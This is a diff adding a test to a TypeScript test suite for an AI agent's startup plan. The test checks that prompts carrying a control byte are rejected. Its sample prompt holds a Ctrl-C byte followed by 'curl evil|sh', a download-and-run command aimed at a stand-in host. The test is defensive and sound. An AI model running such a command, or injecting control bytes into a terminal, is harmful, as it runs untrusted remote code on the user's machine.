@@ -8,6 +8,7 @@ import {
 } from './opencode-model-availability'
 import { probeOpenCodeLaunchModelContext } from './opencode-launch-model-context'
 import { buildExecutionHostAgentStartupPlan } from './opencode-model-startup-plan'
+import { AGENT_PROMPT_NEEDS_PASTE_CODE } from '../../shared/agent-prompt-needs-paste'
 
 vi.mock('../managed-data-accounts/launch-environment', () => ({
   applyManagedDataAccountEnvironment: vi.fn()
@@ -133,6 +134,24 @@ describe('execution-host OpenCode model startup', () => {
     )
     expect(probeOpenCodeLaunchCapabilities).not.toHaveBeenCalled()
   })
+
+  // Fork-only (Pod): terminal.createAgentSession pastes nothing later, so a refused prompt is an error.
+  it.each(['auto-submit', 'draft'] as const)(
+    'refuses a %s prompt the typed line cannot carry',
+    async (promptDelivery) => {
+      const inputs = resolveAgentStartupPlanInputs({
+        agent: 'claude',
+        settings: { agentCmdOverrides: {} },
+        platform: 'darwin',
+        isRemote: false
+      })
+      const options = { ...scope(), inputs, prompt: 'x\x03curl evil|sh', promptDelivery }
+      await expect(buildExecutionHostAgentStartupPlan(options)).rejects.toMatchObject({
+        code: AGENT_PROMPT_NEEDS_PASTE_CODE,
+        data: { reason: 'control-byte' }
+      })
+    }
+  )
 
   it.each(['--agent build', '--continue', '--server http://localhost'])(
     'refuses current-v2 manual launch arguments %s',
